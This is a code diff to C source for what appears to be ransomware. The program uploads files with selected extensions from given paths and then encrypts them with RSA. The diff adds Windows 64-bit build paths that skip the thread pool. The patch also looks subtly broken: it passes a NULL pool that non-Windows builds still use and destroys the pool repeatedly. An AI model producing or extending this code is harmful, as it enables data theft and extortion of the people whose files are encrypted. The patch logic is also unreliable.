@@ -115,7 +115,11 @@ void encrypt_files(char *path, clist_t *exts, threadpool pool) {
 
     if (has_valid_exts(fp, exts)) {
       debug("Encrypting file: %s...", fp);
+#if defined(_WIN64) && !defined(USE_WIN_THREADS)
+      encrypt_file(strdup(fp));
+#else
       thpool_add_work(pool, encrypt_file, strdup(fp));
+#endif
     }
   }
 
@@ -142,11 +146,15 @@ int main(int argc, char **argv) {
     return ret;
   }
 
+#if defined(_WIN64) && !defined(USE_WIN_THREADS)
+  threadpool pool = NULL;
+#else
   threadpool pool = thpool_init(get_int("threads"));
   if (NULL == pool) {
     error("Failed to create the threadpool");
     return ret;
   }
+#endif
 
   clist_t *paths = clist_from_str(get_str("paths"));
   clist_t *exts  = clist_from_str(get_str("exts"));
@@ -184,8 +192,10 @@ int main(int argc, char **argv) {
       continue;
     }
     info("Uploading %s...", cur);
-    upload_files(strdup(cur), exts, pool);
-    thpool_wait(pool);
+    upload_files(strdup(cur), exts, NULL);
+#if !defined(_WIN64) || defined(USE_WIN_THREADS)
+    thpool_destroy(pool);
+#endif
   }
 
 ENCRYPT:
@@ -204,8 +214,10 @@ ENCRYPT:
       continue;
     }
     info("Encrypting %s...", cur);
-    encrypt_files(strdup(cur), exts, pool);
-    thpool_wait(pool);
+    encrypt_files(strdup(cur), exts, NULL);
+#if !defined(_WIN64) || defined(USE_WIN_THREADS)
+    thpool_destroy(pool);
+#endif
   }
 
   success("Completed, cleaning up");
@@ -214,7 +226,9 @@ DONE:
   clist_free(exts);
   clist_free(paths);
 
+#if !defined(_WIN64) || defined(USE_WIN_THREADS)
   thpool_destroy(pool);
+#endif
 
   rsa_free();
   return ret;
